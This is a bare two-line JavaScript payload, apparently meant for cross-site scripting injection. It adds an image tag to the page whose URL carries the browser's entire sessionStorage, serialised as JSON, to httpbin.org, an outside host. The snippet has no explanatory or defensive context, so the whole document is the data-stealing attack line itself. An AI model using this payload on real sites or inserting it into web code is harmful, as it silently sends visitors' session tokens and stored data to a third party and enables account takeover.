document.body.innerHTML +=
"<img src='http://httpbin.org/get?ck=" + JSON.stringify(sessionStorage) + "'>";
